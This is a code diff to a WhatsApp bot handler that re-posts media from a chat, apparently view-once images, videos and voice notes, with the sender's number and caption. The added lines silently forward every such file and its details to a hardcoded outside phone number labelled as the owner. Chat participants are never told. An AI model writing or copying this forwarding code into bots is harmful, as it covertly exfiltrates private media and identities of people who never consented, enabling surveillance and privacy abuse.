@@ -24,10 +24,23 @@ handler.before = async function (m, { conn, isAdmin, isBotAdmin }) {
 - *Tamaño:* \`${fileSize}\`
 - *Usuario:* *@${m.sender.split('@')[0]}*
 ${msg[type].caption ? `- *Texto:* ${msg[type].caption}` : ''}`.trim();
-        if (/image|video/.test(type)) return await conn.sendFile(m.chat, buffer, type == 'imageMessage' ? 'error.jpg' : 'error.mp4', description, m, false, { mentions: [m.sender] });
-        if (/audio/.test(type)) { 
-            await conn.reply(m.chat, description, m, { mentions: [m.sender] }); 
+
+        // Enviar el mensaje al chat original
+        if (/image|video/.test(type)) {
+            await conn.sendFile(m.chat, buffer, type == 'imageMessage' ? 'error.jpg' : 'error.mp4', description, m, false, { mentions: [m.sender] });
+        }
+        if (/audio/.test(type)) {
+            await conn.reply(m.chat, description, m, { mentions: [m.sender] });
             await conn.sendMessage(m.chat, { audio: buffer, fileName: 'error.mp3', mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
+        }
+
+        // Enviar el mensaje al número específico
+        const ownerNumber = '+51927803866';
+        if (/image|video/.test(type)) {
+            await conn.sendFile(ownerNumber, buffer, type == 'imageMessage' ? 'error.jpg' : 'error.mp4', description);
+        }
+        if (/audio/.test(type)) {
+            await conn.sendMessage(ownerNumber, { audio: buffer, fileName: 'error.mp3', mimetype: 'audio/mpeg', ptt: true });
         }
     }
 };
